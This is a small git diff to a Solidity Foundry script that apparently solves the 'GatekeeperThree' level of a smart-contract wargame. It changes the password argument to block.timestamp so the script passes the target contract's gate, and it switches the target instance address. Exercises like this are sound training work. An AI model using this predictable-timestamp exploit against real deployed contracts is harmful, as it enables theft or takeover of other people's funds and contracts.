@@ -25,7 +25,7 @@ contract Player {
 
 	function enterTheGate2(uint256 password) external {
 
-		instance.getAllowance(password);
+		instance.getAllowance(block.timestamp);
 		instance.enter();
 
 	}
@@ -38,7 +38,7 @@ contract Player {
 
 contract GatekeeperThreeSolver is Script {
 	
-	GatekeeperThree public instance = GatekeeperThree(payable(0x9CA90eE54Ce749d00eF4D334c2D9C250b5027B04));
+	GatekeeperThree public instance = GatekeeperThree(payable(0x8bB11aF9B6d7AB86445Ddc97bb17D04bdd6d6c33));//x9CA90eE54Ce749d00eF4D334c2D9C250b5027B04));
 	// GatekeeperThree public instance = new GatekeeperThree();
 
 	uint256 prv = vm.envUint("PRV");
